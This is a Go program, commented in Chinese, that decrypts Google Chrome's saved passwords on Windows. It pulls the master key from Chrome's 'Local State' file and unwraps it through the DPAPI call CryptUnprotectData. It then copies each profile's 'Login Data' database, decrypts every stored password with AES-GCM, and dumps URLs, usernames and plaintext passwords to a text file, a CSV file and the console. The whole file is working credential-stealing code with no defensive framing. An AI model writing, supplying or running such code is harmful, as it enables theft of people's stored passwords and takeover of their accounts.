package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

const (
	// 禁止用户界面交互的标志
	cryptProtectUiForbidden = 0x1
)

var (
	// 加载Crypt32.dll和Kernel32.dll
	dllCrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllKernel32 = syscall.NewLazyDLL("Kernel32.dll")

	// 获取CryptUnprotectData和LocalFree函数的指针
	procDecryptData = dllCrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllKernel32.NewProc("LocalFree")
)

// DataBlob 结构体用于表示加密数据的Blob
type DataBlob struct {
	DataSize uint32
	DataPtr  *byte
}

// NewDataBlob 创建一个新的DataBlob实例
func NewDataBlob(data []byte) *DataBlob {
	if len(data) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		DataPtr:  &data[0],
		DataSize: uint32(len(data)),
	}
}

// ToByteArray 将DataBlob转换为字节数组
func (b *DataBlob) ToByteArray() []byte {
	data := make([]byte, b.DataSize)
	copy(data, (*[1 << 30]byte)(unsafe.Pointer(b.DataPtr))[:])
	return data
}

// DecryptData 解密加密数据
func DecryptData(encryptedData []byte) ([]byte, error) {
	var decryptedBlob DataBlob
	encryptedBlob := NewDataBlob(encryptedData)

	// 调用CryptUnprotectData函数解密数据
	result, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(encryptedBlob)), 0, 0, 0, 0, cryptProtectUiForbidden, uintptr(unsafe.Pointer(&decryptedBlob)))
	if result == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(decryptedBlob.DataPtr)))

	return decryptedBlob.ToByteArray(), nil
}

// GetSecretKey 从Chrome的Local State文件中获取加密的密钥并解密
func GetSecretKey() ([]byte, error) {
	userProfile := os.Getenv("USERPROFILE")
	localStatePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	stateBytes, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State file: %w", err)
	}

	if err := json.Unmarshal(stateBytes, &localState); err != nil {
		return nil, fmt.Errorf("failed to unmarshal Local State JSON: %w", err)
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64 encrypted key: %w", err)
	}

	decryptedKey, err := DecryptData(encryptedKey[5:])
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt key: %w", err)
	}

	return decryptedKey, nil
}

// DecryptValue 使用AES-GCM解密加密的值
func DecryptValue(encryptedValue, key []byte) (string, error) {
	nonce := encryptedValue[3 : 3+12]
	encryptedValueWithTag := encryptedValue[3+12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create AES cipher: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM cipher: %w", err)
	}

	decryptedValue, err := aesGCM.Open(nil, nonce, encryptedValueWithTag, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt value: %w", err)
	}

	return string(decryptedValue), nil
}

// GetDBConnection 获取SQLite数据库连接
func GetDBConnection(chromeLoginDBPath string) (*sql.DB, error) {
	tempDBPath := "Loginvault.db"
	if err := CopyFile(chromeLoginDBPath, tempDBPath); err != nil {
		return nil, fmt.Errorf("failed to copy database file: %w", err)
	}

	db, err := sql.Open("sqlite3", tempDBPath)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	return db, nil
}

// CopyFile 复制文件
func CopyFile(src, dst string) error {
	input, err := ioutil.ReadFile(src)
	if err != nil {
		return fmt.Errorf("failed to read source file: %w", err)
	}

	if err := ioutil.WriteFile(dst, input, 0644); err != nil {
		return fmt.Errorf("failed to write destination file: %w", err)
	}

	return nil
}

func main() {
	userProfile := os.Getenv("USERPROFILE")
	chromePath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data")

	secretKey, err := GetSecretKey()
	if err != nil {
		fmt.Printf("Error getting secret key: %v\n", err)
		return
	}

	// 创建或打开一个名为 browser_passwords.txt 的文件
	file, err := os.Create("browser_passwords.txt")
	if err != nil {
		fmt.Printf("Error creating password file: %v\n", err)
		return
	}
	defer file.Close()

	// 创建一个 CSV 文件用于存储解密后的密码
	csvFile, err := os.Create("decrypted_passwords.csv")
	if err != nil {
		fmt.Printf("Error creating CSV file: %v\n", err)
		return
	}
	defer csvFile.Close()

	writer := csv.NewWriter(csvFile)
	defer writer.Flush()

	writer.Write([]string{"index", "url", "username", "password"})

	folders, err := os.ReadDir(chromePath)
	if err != nil {
		fmt.Printf("Error reading Chrome directory: %v\n", err)
		return
	}

	profileRegex := regexp.MustCompile(`^Profile*|^Default$`)
	for _, folder := range folders {
		if !profileRegex.MatchString(folder.Name()) {
			continue
		}

		chromeLoginDBPath := filepath.Join(chromePath, folder.Name(), "Login Data")
		db, err := GetDBConnection(chromeLoginDBPath)
		if err != nil {
			fmt.Printf("Error getting database connection: %v\n", err)
			continue
		}
		defer db.Close()
		defer os.Remove("Loginvault.db")

		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
		if err != nil {
			fmt.Printf("Error querying database: %v\n", err)
			continue
		}
		defer rows.Close()

		for i := 0; rows.Next(); i++ {
			var url, username string
			var encryptedPassword []byte
			if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
				fmt.Printf("Error scanning row: %v\n", err)
				continue
			}

			if url == "" || username == "" || len(encryptedPassword) == 0 {
				continue
			}

			decryptedPassword, err := DecryptValue(encryptedPassword, secretKey)
			if err != nil {
				fmt.Printf("Error decrypting password: %v\n", err)
				continue
			}

			fmt.Printf("Sequence: %d\n", i)
			fmt.Printf("URL: %s\nUser Name: %s\nPassword: %s\n", url, username, decryptedPassword)
			fmt.Println("******************************************")

			// 将解密后的密码写入 CSV 文件
			writer.Write([]string{fmt.Sprintf("%d", i), url, username, decryptedPassword})

			// 将解密后的密码写入 browser_passwords.txt 文件
			_, err = file.WriteString(fmt.Sprintf("Sequence: %d\nURL: %s\nUser Name: %s\nPassword: %s\n******************************************\n", i, url, username, decryptedPassword))
			if err != nil {
				fmt.Printf("Error writing to password file: %v\n", err)
				continue
			}
		}
	}
}
